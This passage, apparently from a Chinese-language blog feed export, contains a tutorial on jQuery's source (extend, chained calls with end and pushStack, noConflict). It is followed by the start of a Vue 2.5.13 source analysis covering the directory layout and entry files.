<h2 id="jQuery-fn-extend-与-jQuery-extend"><a href="#jQuery-fn-extend-与-jQuery-extend" class="headerlink" title="jQuery.fn.extend 与 jQuery.extend"></a><code>jQuery.fn.extend</code> 与 <code>jQuery.extend</code></h2><p><code>extend</code> 方法在 <code>jQuery</code> 中是一个很重要的方法，<code>jQuery</code> 内部用它来扩展静态方法或实例方法，而且我们开发 <code>jQuery</code> 插件开发的时候也会用到它。但是在内部，是存在 <code>jQuery.fn.extend</code> 和 <code>jQuery.extend</code> 两个 <code>extend</code> 方法的，而区分这两个 <code>extend</code> 方法是理解 <code>jQuery</code> 的很关键的一部分。先看结论：</p>
<p>1）<code>jQuery.extend(object)</code> 为扩展 <code>jQuery</code> 类本身，为类添加新的静态方法；</p>
<p>2）<code>jQuery.fn.extend(object)</code> 给 <code>jQuery</code> 对象添加实例方法，也就是通过这个 <code>extend</code> 添加的新方法，实例化的 <code>jQuery</code> 对象都能使用，因为它是挂载在 <code>jQuery.fn</code> 上的方法（上文有提到，<code>jQuery.fn = jQuery.prototype</code> ）。</p>
<p>它们的官方解释是：</p>
<p>1）<code>jQuery.extend()</code>: 把两个或者更多的对象合并到第一个当中，</p>
<p>2）<code>jQuery.fn.extend()</code>：把对象挂载到 <code>jQuery</code> 的 <code>prototype</code> 属性，来扩展一个新的 <code>jQuery</code> 实例方法。</p>
<p>也就是说，使用 <code>jQuery.extend()</code> 拓展的静态方法，我们可以直接使用 <code>$.xxx</code> 进行调用（xxx是拓展的方法名），</p>
<p>而使用 <code>jQuery.fn.extend()</code> 拓展的实例方法，需要使用 <code>$().xxx</code> 调用。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 扩展合并函数</span></span><br><span class="line"><span class="comment">// 合并两个或更多对象的属性到第一个对象中，jQuery 后续的大部分功能都通过该函数扩展</span></span><br><span class="line"><span class="comment">// 虽然实现方式一样，但是要注意区分用法的不一样，那么为什么两个方法指向同一个函数实现，但是却实现不同的功能呢,</span></span><br><span class="line"><span class="comment">// 阅读源码就能发现这归功于 this 的强大力量</span></span><br><span class="line"><span class="comment">// 如果传入两个或多个对象，所有对象的属性会被添加到第一个对象 target</span></span><br><span class="line"><span class="comment">// 如果只传入一个对象，则将对象的属性添加到 jQuery 对象中，也就是添加静态方法</span></span><br><span class="line"><span class="comment">// 用这种方式，我们可以为 jQuery 命名空间增加新的方法，可以用于编写 jQuery 插件</span></span><br><span class="line"><span class="comment">// 如果不想改变传入的对象，可以传入一个空对象：$.extend(&#123;&#125;, object1, object2);</span></span><br><span class="line"><span class="comment">// 默认合并操作是不迭代的，即便 target 的某个属性是对象或属性，也会被完全覆盖而不是合并</span></span><br><span class="line"><span class="comment">// 如果第一个参数是 true，则是深拷贝</span></span><br><span class="line"><span class="comment">// 从 object 原型继承的属性会被拷贝，值为 undefined 的属性不会被拷贝</span></span><br><span class="line"><span class="comment">// 因为性能原因，JavaScript 自带类型的属性不会合并</span></span><br><span class="line">jQuery.extend = jQuery.fn.extend = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src, copyIsArray, copy, name, options, clone,</span><br><span class="line">        target = <span class="built_in">arguments</span>[<span class="number">0</span>] || &#123;&#125;,</span><br><span class="line">        i = <span class="number">1</span>,</span><br><span class="line">        length = <span class="built_in">arguments</span>.length,</span><br><span class="line">        deep = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle a deep copy situation</span></span><br><span class="line">    <span class="comment">// target 是传入的第一个参数</span></span><br><span class="line">    <span class="comment">// 如果第一个参数是布尔类型，则表示是否要深递归，</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> target === <span class="string">"boolean"</span>) &#123;</span><br><span class="line">        deep = target;</span><br><span class="line">        target = <span class="built_in">arguments</span>[<span class="number">1</span>] || &#123;&#125;;</span><br><span class="line">        <span class="comment">// skip the boolean and the target</span></span><br><span class="line">        <span class="comment">// 如果传了类型为 boolean 的第一个参数，i 则从 2 开始</span></span><br><span class="line">        i = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle case when target is a string or something (possible in deep copy)</span></span><br><span class="line">    <span class="comment">// 如果传入的第一个参数是 字符串或者其他</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> target !== <span class="string">"object"</span> &amp;&amp; !jQuery.isFunction(target)) &#123;</span><br><span class="line">        target = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// extend jQuery itself if only one argument is passed</span></span><br><span class="line">    <span class="comment">// 如果参数的长度为 1 ，表示是 jQuery 静态方法</span></span><br><span class="line">    <span class="keyword">if</span> (length === i) &#123;</span><br><span class="line">        target = <span class="keyword">this</span>;</span><br><span class="line">        --i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以传入多个复制源</span></span><br><span class="line">    <span class="comment">// i 是从 1或2 开始的</span></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="comment">// Only deal with non-null/undefined values</span></span><br><span class="line">        <span class="comment">// 将每个源的属性全部复制到 target 上</span></span><br><span class="line">        <span class="keyword">if</span> ((options = <span class="built_in">arguments</span>[i]) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Extend the base object</span></span><br><span class="line">            <span class="keyword">for</span> (name <span class="keyword">in</span> options) &#123;</span><br><span class="line">                <span class="comment">// src 是源（即本身）的值</span></span><br><span class="line">                <span class="comment">// copy 是即将要复制过去的值</span></span><br><span class="line">                src = target[name];</span><br><span class="line">                copy = options[name];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Prevent never-ending loop</span></span><br><span class="line">                <span class="comment">// 防止有环，例如 extend(true, target, &#123;'target':target&#125;);</span></span><br><span class="line">                <span class="keyword">if</span> (target === copy) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Recurse if we're merging plain objects or arrays</span></span><br><span class="line">                <span class="comment">// 这里是递归调用，最终都会到下面的 else if 分支</span></span><br><span class="line">                <span class="comment">// jQuery.isPlainObject 用于测试是否为纯粹的对象</span></span><br><span class="line">                <span class="comment">// 纯粹的对象指的是 通过 "&#123;&#125;" 或者 "new Object" 创建的</span></span><br><span class="line">                <span class="comment">// 如果是深复制</span></span><br><span class="line">                <span class="keyword">if</span> (deep &amp;&amp; copy &amp;&amp; (jQuery.isPlainObject(copy) || (copyIsArray = jQuery.isArray(copy)))) &#123;</span><br><span class="line">                    <span class="comment">// 数组</span></span><br><span class="line">                    <span class="keyword">if</span> (copyIsArray) &#123;</span><br><span class="line">                        copyIsArray = <span class="literal">false</span>;</span><br><span class="line">                        clone = src &amp;&amp; jQuery.isArray(src) ? src : [];</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 对象</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        clone = src &amp;&amp; jQuery.isPlainObject(src) ? src : &#123;&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Never move original objects, clone them</span></span><br><span class="line">                    <span class="comment">// 递归</span></span><br><span class="line">                    target[name] = jQuery.extend(deep, clone, copy);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Don't bring in undefined values</span></span><br><span class="line">                    <span class="comment">// 最终都会到这条分支</span></span><br><span class="line">                    <span class="comment">// 简单的值覆盖</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (copy !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">                    target[name] = copy;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the modified object</span></span><br><span class="line">    <span class="comment">// 返回新的 target</span></span><br><span class="line">    <span class="comment">// 如果 i &lt; length ，是直接返回没经过处理的 target，也就是 arguments[0]</span></span><br><span class="line">    <span class="comment">// 也就是如果不传需要覆盖的源，调用 $.extend 其实是增加 jQuery 的静态方法</span></span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是这一句 <code>jQuery.extend = jQuery.fn.extend = function() {}</code> ，也就是 <code>jQuery.extend</code> 的实现和 <code>jQuery.fn.extend</code> 的实现共用了同一个方法，但是为什么能够实现不同的功能了，这就要归功于 <code>Javascript</code> 强大（怪异？）的 <code>this</code> 了。</p>
<p>1）在 <code>jQuery.extend()</code> 中，<code>this</code> 的指向是 <code>jQuery</code> 对象(或者说是 <code>jQuery</code> 类)，所以这里扩展在 <code>jQuery</code> 上；</p>
<p>2）在 <code>jQuery.fn.extend()</code> 中，<code>this</code> 的指向是 <code>fn</code> 对象，前面有提到 <code>jQuery.fn = jQuery.prototype</code> ，也就是这里增加的是原型方法，也就是对象方法。</p>
<h2 id="jQuery-的链式调用及回溯"><a href="#jQuery-的链式调用及回溯" class="headerlink" title="jQuery 的链式调用及回溯"></a><code>jQuery</code> 的链式调用及回溯</h2><p>另一个让大家喜爱使用 <code>jQuery</code> 的原因是它的链式调用，这一点的实现其实很简单，只需要在要实现链式调用的方法的返回结果里，返回 <code>this</code> ，就能够实现链式调用了。</p>
<p>当然，除了链式调用，<code>jQuery</code> 甚至还允许回溯，看看：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过 end() 方法终止在当前链的最新过滤操作，返回上一个对象集合</span></span><br><span class="line">$(<span class="string">'div'</span>).eq(<span class="number">0</span>).show().end().eq(<span class="number">1</span>).hide();</span><br></pre></td></tr></table></figure></p>
<p>当选择了 (‘div’).eq(0) 之后使用 end() 可以回溯到上一步选中的 jQuery 对象 $(‘div’)，其内部实现其实是依靠添加了 prevObject 这个属性：<br><img src="/static/img/608782-20160314191813506-188474195.jpg" width="800"><br><code>jQuery</code> 完整的链式调用、增栈、回溯通过 <code>return this</code> 、 <code>return this.pushStack()</code> 、<code>return this.prevObject</code> 实现，看看源码实现：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">jQuery.fn = jQuery.prototype = &#123;</span><br><span class="line">    <span class="comment">// 将一个 DOM 元素集合加入到 jQuery 栈</span></span><br><span class="line">    <span class="comment">// 此方法在 jQuery 的 DOM 操作中被频繁的使用, 如在 parent(), find(), filter() 中</span></span><br><span class="line">    <span class="comment">// pushStack() 方法通过改变一个 jQuery 对象的 prevObject 属性来跟踪链式调用中前一个方法返回的 DOM 结果集合</span></span><br><span class="line">    <span class="comment">// 当我们在链式调用 end() 方法后, 内部就返回当前 jQuery 对象的 prevObject 属性</span></span><br><span class="line">    pushStack: <span class="function"><span class="keyword">function</span>(<span class="params">elems</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 构建一个新的jQuery对象，无参的 this.constructor()，只是返回引用this</span></span><br><span class="line">        <span class="comment">// jQuery.merge 把 elems 节点合并到新的 jQuery 对象</span></span><br><span class="line">        <span class="comment">// this.constructor 就是 jQuery 的构造函数 jQuery.fn.init，所以 this.constructor() 返回一个 jQuery 对象</span></span><br><span class="line">        <span class="comment">// 由于 jQuery.merge 函数返回的对象是第二个函数附加到第一个上面，所以 ret 也是一个 jQuery 对象，这里可以解释为什么 pushStack 出入的 DOM 对象也可以用 CSS 方法进行操作</span></span><br><span class="line">        <span class="keyword">var</span> ret = jQuery.merge(<span class="keyword">this</span>.constructor(), elems);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 给返回的新 jQuery 对象添加属性 prevObject</span></span><br><span class="line">        <span class="comment">// 所以也就是为什么通过 prevObject 能取到上一个合集的引用了</span></span><br><span class="line">        ret.prevObject = <span class="keyword">this</span>;</span><br><span class="line">        ret.context = <span class="keyword">this</span>.context;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return the newly-formed element set</span></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 回溯链式调用的上一个对象</span></span><br><span class="line">    end: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 回溯的关键是返回 prevObject 属性</span></span><br><span class="line">        <span class="comment">// 而 prevObject 属性保存了上一步操作的 jQuery 对象集合</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.prevObject || <span class="keyword">this</span>.constructor(<span class="literal">null</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 取当前 jQuery 对象的第 i 个</span></span><br><span class="line">    eq: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// jQuery 对象集合的长度</span></span><br><span class="line">        <span class="keyword">var</span> len = <span class="keyword">this</span>.length,</span><br><span class="line">            j = +i + (i &lt; <span class="number">0</span> ? len : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用 pushStack 返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.pushStack(j &gt;= <span class="number">0</span> &amp;&amp; j &lt; len ? [<span class="keyword">this</span>[j]] : []);</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>总的来说，</p>
<p>1）<code>end()</code> 方法返回 <code>prevObject</code> 属性，这个属性记录了上一步操作的 <code>jQuery</code> 对象合集；</p>
<p>2）而 <code>prevObject</code> 属性由 <code>pushStack()</code> 方法生成，该方法将一个 <code>DOM</code> 元素集合加入到 <code>jQuery</code> 内部管理的一个栈中，通过改变 <code>jQuery</code> 对象的 <code>prevObject</code> 属性来跟踪链式调用中前一个方法返回的 <code>DOM</code> 结果集合</p>
<p>3）当我们在链式调用 <code>end()</code> 方法后，内部就返回当前 <code>jQuery</code> 对象的 <code>prevObject</code> 属性，完成回溯。</p>
<h2 id="jQuery-正则与细节优化"><a href="#jQuery-正则与细节优化" class="headerlink" title="jQuery 正则与细节优化"></a><code>jQuery</code> 正则与细节优化</h2><p>不得不提 jQuery 在细节优化上做的很好。也存在很多值得学习的小技巧，下一篇将会以 jQuery 中的一些编程技巧为主题行文，这里就不再赘述。</p>
<p>然后想谈谈正则表达式，jQuery 当中用了大量的正则表达式，我觉得如果研读 jQuery ，正则水平一定能够大大提升，如果是个正则小白，我建议在阅读之前先去了解以下几点：</p>
<p>1）了解并尝试使用 <code>Javascript</code> 正则相关 <code>API</code>，包括了 <code>test()</code> 、<code>replace()</code>、<code>match()</code> 、<code>exec()</code> 的用法；</p>
<p>2）区分上面 4 个方法，哪个是 <code>RegExp</code> 对象方法，哪个是 <code>String</code> 对象方法；</p>
<p>3）了解简单的<code>零宽断言</code>，了解什么是<code>匹配但是不捕获</code>以及<code>匹配并且捕获</code>。</p>
<h2 id="jQuery-变量冲突处理"><a href="#jQuery-变量冲突处理" class="headerlink" title="jQuery 变量冲突处理"></a><code>jQuery</code> 变量冲突处理</h2><p>最后想提一提 <code>jQuery</code> 变量的冲突处理，通过一开始保存全局变量的 <code>window.jQuery</code> 以及 <code>windw.$</code> 。</p>
<p>当需要处理冲突的时候，调用静态方法 <code>noConflict()</code>，让出变量的控制权，源码如下：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, undefined</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span></span><br><span class="line">        <span class="comment">// Map over jQuery in case of overwrite</span></span><br><span class="line">        <span class="comment">// 设置别名，通过两个私有变量映射了 window 环境下的 jQuery 和 $ 两个对象，以防止变量被强行覆盖</span></span><br><span class="line">        _jQuery = <span class="built_in">window</span>.jQuery,</span><br><span class="line">        _$ = <span class="built_in">window</span>.$;</span><br><span class="line"></span><br><span class="line">    jQuery.extend(&#123;</span><br><span class="line">        <span class="comment">// noConflict() 方法让出变量 $ 的 jQuery 控制权，这样其他脚本就可以使用它了</span></span><br><span class="line">        <span class="comment">// 通过全名替代简写的方式来使用 jQuery</span></span><br><span class="line">        <span class="comment">// deep -- 布尔值，指示是否允许彻底将 jQuery 变量还原(移交 $ 引用的同时是否移交 jQuery 对象本身)</span></span><br><span class="line">        noConflict: <span class="function"><span class="keyword">function</span>(<span class="params">deep</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 判断全局 $ 变量是否等于 jQuery 变量</span></span><br><span class="line">            <span class="comment">// 如果等于，则重新还原全局变量 $ 为 jQuery 运行之前的变量（存储在内部变量 _$ 中）</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">window</span>.$ === jQuery) &#123;</span><br><span class="line">                <span class="comment">// 此时 jQuery 别名 $ 失效</span></span><br><span class="line">                <span class="built_in">window</span>.$ = _$;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 当开启深度冲突处理并且全局变量 jQuery 等于内部 jQuery，则把全局 jQuery 还原成之前的状况</span></span><br><span class="line">            <span class="keyword">if</span> (deep &amp;&amp; <span class="built_in">window</span>.jQuery === jQuery) &#123;</span><br><span class="line">                <span class="comment">// 如果 deep 为 true，此时 jQuery 失效</span></span><br><span class="line">                <span class="built_in">window</span>.jQuery = _jQuery;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 这里返回的是 jQuery 库内部的 jQuery 构造函数（new jQuery.fn.init()）</span></span><br><span class="line">            <span class="comment">// 像使用 $ 一样尽情使用它吧</span></span><br><span class="line">            <span class="keyword">return</span> jQuery;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;(<span class="built_in">window</span>)</span><br></pre></td></tr></table></figure></p>
<p>那么让出了这两个符号之后，是否就不能在我们的代码中使用 <code>jQuery</code> 或者呢 <code>$</code> 呢？莫慌，还是可以使用的：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 让出 jQuery 、$ 的控制权不代表不能使用 jQuery 和 $ ，方法如下：</span></span><br><span class="line"><span class="keyword">var</span> query = jQuery.noConflict(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插件或其他形式的代码，也可以将参数设为 jQuery</span></span><br><span class="line">&#125;)(query);</span><br><span class="line"></span><br><span class="line"><span class="comment">//  ... 其他用 $ 作为别名的库的代码</span></span><br></pre></td></tr></table></figure></p>
<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>对 <code>jQuery</code> 整体架构的一些解析就到这里，下一篇将会剖析一下 <code>jQuery</code> 中的一些优化小技巧，一些对编程有所提高的地方。 <a href="/2017/04/17/jQuery_源码分析_奇淫技巧/">jQuery_源码分析_奇淫技巧</a></p>
]]></content>
      <categories>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>源码</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue_vue源码分析_原型&amp;全局API</title>
    <url>/2018/05/10/Vue_vue%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0&amp;API/</url>
    <content><![CDATA[<h1 id="前端架构之路，好胆你就来。"><a href="#前端架构之路，好胆你就来。" class="headerlink" title="前端架构之路，好胆你就来。"></a>前端架构之路，好胆你就来。</h1><p>看过很多关于<code>Vue</code>源码的文章，觉得自己技术栈很重要的一环就是<code>Vue</code>，所以就想自己也写一篇关于<code>Vue</code>源码的文章。<br>这是我关于<code>Vue</code>源码分析的第一篇文章，主要是讲的是构造函数<code>Vue</code>原型上的方法，全局API。并不涉及编译过程、数据绑定、路由实现、store数据仓库等每个细节的具体实现，具体实现细节后边的文章中会陆续涉及。<br>本文章讲解的源码是基于<code>Vue 2.5.13</code>的。因为自己的业务线需要使用<code>Vue.compiler</code>，并且我做的项目是web客户端渲染，所以这里只讲解<code>with-compiler</code>的版本。</p>
<p>了解一项工程首先要从目录结构以及入口文件开始了解。就像你了解一个姑娘，应该以她为中心辐射她的社交圈一样。</p>
<h2 id="入口文件"><a href="#入口文件" class="headerlink" title="入口文件"></a>入口文件</h2><p><code>Vue</code>的源码是一个标准的<code>npm</code>工程目录结构，目录结构如下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">├── dist ---------------------------------- 构建后文件的输出目录</span><br><span class="line">├── examples ------------------------------ 存放一些使用Vue开发的应用案例</span><br><span class="line">├── flow ---------------------------------- 类型声明，使用开源项目 [Flow](https://flowtype.org/)</span><br><span class="line">├── <span class="built_in">test</span> ---------------------------------- 包含所有测试文件</span><br><span class="line">├── scripts ------------------------------- 构建相关的文件，一般情况下我们不需要动</span><br><span class="line">├── src ----------------------------------- 这个是我们最应该关注的目录，包含了源码</span><br><span class="line">│   ├── compiler -------------------------- 编译器代码的存放目录，将 template 编译为 render 函数</span><br><span class="line">│   │   ├── codegen ----------------------- 存放从抽象语法树(AST)生成render函数的代码</span><br><span class="line">│   │   ├── directives -------------------- 存放处理指令的相关代码</span><br><span class="line">│   │   ├── parser ------------------------ 存放将模板字符串转换成元素抽象语法树的代码</span><br><span class="line">│   │   ├── optimizer.js ------------------ 分析静态树，优化vdom渲染</span><br><span class="line">│   ├── core ------------------------------ 存放通用的，平台无关的代码</span><br><span class="line">│   │   ├── components -------------------- 包含抽象出来的通用组件</span><br><span class="line">│   │   ├── global-api -------------------- 包含给Vue构造函数挂载全局方法(静态方法)或属性的代码</span><br><span class="line">│   │   ├── instance ---------------------- 包含Vue构造函数设计相关的代码</span><br><span class="line">│   │   ├── observer ---------------------- 反应系统，包含数据观测的核心代码</span><br><span class="line">│   │   ├── util -------------------------- 包含核心代码的一些常用工具和配置【策略打表】</span><br><span class="line">│   │   ├── vdom -------------------------- 包含虚拟DOM创建(creation)和打补丁(patching)的代码</span><br><span class="line">│   ├── platforms ------------------------- 包含平台特有的相关代码以及不同的构建的或包的入口文件</span><br><span class="line">│   │   ├── entry-compiler.js ------------- vue-template-compiler 包的入口文件</span><br><span class="line">│   │   ├── entry-runtime.js -------------- 运行时构建的入口，输出 dist/vue.common.js 文件，不包含模板(template)到render函数的编译器，所以不支持 `template` 选项，我们使用vue默认导出的就是这个运行时的版本。大家使用的时候要注意</span><br><span class="line">│   │   ├── entry-runtime-with-compiler.js  独立构建版本的入口，输出 dist/vue.js，它包含模板(template)到render函数的编译器</span><br><span class="line">│   │   ├── entry-server-renderer.js ------ vue-server-renderer 包的入口文件</span><br><span class="line">│   ├── server ---------------------------- 包含服务端渲染(server-side rendering)的相关代码</span><br><span class="line">│   ├── sfc ------------------------------- 包含单文件组件(.vue文件)的解析逻辑，用于vue-template-compiler包</span><br><span class="line">│   ├── shared ---------------------------- 包含整个代码库通用的代码</span><br><span class="line">├── package.json -------------------------- 不解释</span><br></pre></td></tr></table></figure></p>
<h3 id="entry-runtime-with-compiler-js"><a href="#entry-runtime-with-compiler-js" class="headerlink" title="entry-runtime-with-compiler.js"></a>entry-runtime-with-compiler.js</h3><p>我们看到独立构建版本的入口，是<code>entry-runtime-with-compiler.js</code>,所以我们从这个文件入手。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入Vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'./runtime/index'</span></span><br><span class="line"><span class="keyword">import</span> &#123; compileToFunctions &#125; <span class="keyword">from</span> <span class="string">'./compiler/index'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓存原有原型上的方法$mount</span></span><br><span class="line"><span class="keyword">const</span> mount = Vue.prototype.$mount</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换原型方法$mount</span></span><br><span class="line">Vue.prototype.$mount = <span class="function"><span class="keyword">function</span> (<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  el?: string | Element,</span></span></span><br><span class="line"><span class="function"><span class="params">  hydrating?: boolean</span></span></span><br><span class="line"><span class="function"><span class="params"></span>): <span class="title">Component</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挂在全局方法compile</span></span><br><span class="line">Vue.compile = compileToFunctions</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure></p>
<ul>
<li>1、我们看到这个入口文件重载了原型上的<code>$mount</code>方法</li>
<li>2、在Vue上挂载了全局方法compile</li>
<li>3、<code>Vue</code>是从<code>/src/platforms/web/runtime/index.js</code>引入的，我们查看这个文件</li>
</ul>
<h3 id="src-platforms-web-runtime-index-js"><a href="#src-platforms-web-runtime-index-js" class="headerlink" title="/src/platforms/web/runtime/index.js"></a>/src/platforms/web/runtime/index.js</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'core/index'</span></span><br><span class="line"></span><br><span class="line">Vue.config.mustUseProp = mustUseProp</span><br><span class="line">Vue.config.isReservedTag = isReservedTag</span><br><span class="line">Vue.config.isReservedAttr = isReservedAttr</span><br><span class="line">Vue.config.getTagNamespace = getTagNamespace</span><br><span class="line">Vue.config.isUnknownElement = isUnknownElement</span><br><span class="line"></span><br><span class="line">extend(Vue.options.directives, platformDirectives)</span><br><span class="line">extend(Vue.options.components, platformComponents)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装原型方法__patch__ [带下划线代表内部使用]</span></span><br><span class="line">Vue.prototype.__patch__ = inBrowser ? patch : noop</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装原型上的$mount方法</span></span><br><span class="line">Vue.prototype.$mount = <span class="function"><span class="keyword">function</span> (<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  el?: string | Element,</span></span></span><br><span class="line"><span class="function"><span class="params">  hydrating?: boolean</span></span></span><br><span class="line"><span class="function"><span class="params"></span>): <span class="title">Component</span> </span>&#123;</span><br><span class="line">  el = el &amp;&amp; inBrowser ? query(el) : <span class="literal">undefined</span></span><br><span class="line">  <span class="keyword">return</span> mountComponent(<span class="keyword">this</span>, el, hydrating)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure>
<ul>
<li>1、我们看到这个文件主要是安装了原型方法<code>$mount</code></li>
<li>2、设置了全局属性<code>Vue.config</code></li>
<li>3、<code>Vue</code>是从<code>/src/core/index.js</code>引入的，我们查看这个文件</li>
</ul>
<h3 id="src-core-index-js"><a href="#src-core-index-js" class="headerlink" title="/src/core/index.js"></a>/src/core/index.js</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'./instance/index'</span></span><br><span class="line"><span class="keyword">import</span> &#123; initGlobalAPI &#125; <span class="keyword">from</span> <span class="string">'./global-api/index'</span></span><br><span class="line"><span class="keyword">import</span> &#123; isServerRendering &#125; <span class="keyword">from</span> <span class="string">'core/util/env'</span></span><br><span class="line"><span class="keyword">import</span> &#123; FunctionalRenderContext &#125; <span class="keyword">from</span> <span class="string">'core/vdom/create-functional-component'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 挂在全局API</span></span><br><span class="line">initGlobalAPI(Vue)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$isServer'</span>, &#123;</span><br><span class="line">  <span class="keyword">get</span>: isServerRendering</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">Object.defineProperty(Vue.prototype, '$ssrContext', &#123;</span><br><span class="line">  <span class="keyword">get</span> () &#123;</span><br><span class="line">    <span class="comment">/* istanbul ignore next */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.$vnode &amp;&amp; <span class="keyword">this</span>.$vnode.ssrContext</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// expose FunctionalRenderContext for ssr runtime helper installation</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Vue, <span class="string">'FunctionalRenderContext'</span>, &#123;</span><br><span class="line">  value: FunctionalRenderContext</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">Vue.version = <span class="string">'__VERSION__'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure>
<ul>
<li>1、执行了<code>initGlobalAPI(Vue)</code>，就字面意思而言，应该是初始化了一些全局的API，后边用图示讲解</li>
<li>2、添加原型属性<code>$isServer</code>,<code>$ssrContext</code></li>
<li>3、添加全局属性<code>FunctionalRenderContext</code></li>
<li>4、<code>Vue</code>是从<code>/src/core/instance/index.js</code>引入的，我们查看这个文件</li>
</ul>
